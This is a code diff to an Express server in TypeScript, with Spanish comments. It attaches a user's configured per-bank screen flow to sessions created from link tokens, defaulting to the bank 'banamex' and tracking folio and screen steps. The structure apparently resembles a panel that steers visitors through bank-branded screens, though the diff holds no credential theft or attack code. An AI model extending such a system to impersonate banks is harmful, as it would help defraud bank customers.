@@ -209,14 +209,32 @@ export async function registerRoutes(app: Express): Promise<Server> {
           sessionId += Math.floor(Math.random() * 10).toString();
         }
 
-        // Crear la sesión con datos del token
+        // Obtener el flujo configurado del usuario para este banco
+        let flowConfig = null;
+        let currentStepIndex = 0;
+        let flowState = null;
+        
+        if (tokenResult.userId && tokenResult.bankCode) {
+          const userFlow = await storage.getUserBankFlow(tokenResult.userId, tokenResult.bankCode);
+          if (userFlow && userFlow.flowConfig) {
+            flowConfig = userFlow.flowConfig;
+            currentStepIndex = 0;
+            flowState = 'active';
+            console.log(`[Links] Aplicando flujo de usuario para banco ${tokenResult.bankCode}`);
+          }
+        }
+
+        // Crear la sesión con datos del token y flujo de usuario
         session = await storage.createSession({
           sessionId,
           banco: tokenResult.bankCode || 'banamex',
           folio: sessionId,
           pasoActual: ScreenType.FOLIO,
           createdBy: tokenResult.createdBy || 'system',
-          executiveId: null
+          executiveId: null,
+          flowConfig,
+          currentStepIndex,
+          flowState
         });
 
         // Actualizar el token con el sessionId creado
@@ -224,7 +242,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         
         // NO consumir el token aún - se consumirá cuando el usuario ingrese el folio
 
-        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}`);
+        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}, con flujo: ${flowConfig ? 'sí' : 'no'}`);
       } else {
         console.log(`[Links] Reutilizando sesión existente: ${session.sessionId}`);
       }
@@ -287,14 +305,32 @@ export async function registerRoutes(app: Express): Promise<Server> {
           sessionId += Math.floor(Math.random() * 10).toString();
         }
 
-        // Crear la sesión con datos del token
+        // Obtener el flujo configurado del usuario para este banco
+        let flowConfig = null;
+        let currentStepIndex = 0;
+        let flowState = null;
+        
+        if (tokenResult.userId && tokenResult.bankCode) {
+          const userFlow = await storage.getUserBankFlow(tokenResult.userId, tokenResult.bankCode);
+          if (userFlow && userFlow.flowConfig) {
+            flowConfig = userFlow.flowConfig;
+            currentStepIndex = 0;
+            flowState = 'active';
+            console.log(`[Links] Aplicando flujo de usuario para banco ${tokenResult.bankCode}`);
+          }
+        }
+
+        // Crear la sesión con datos del token y flujo de usuario
         session = await storage.createSession({
           sessionId,
           banco: tokenResult.bankCode || 'banamex',
           folio: sessionId,
           pasoActual: ScreenType.FOLIO,
           createdBy: tokenResult.createdBy || 'system',
-          executiveId: null
+          executiveId: null,
+          flowConfig,
+          currentStepIndex,
+          flowState
         });
 
         // Actualizar el token con el sessionId creado
@@ -302,7 +338,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         
         // NO consumir el token aún - se consumirá cuando el usuario ingrese el folio
 
-        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}`);
+        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}, con flujo: ${flowConfig ? 'sí' : 'no'}`);
       } else {
         console.log(`[Links] Reutilizando sesión existente: ${session.sessionId}`);
       }
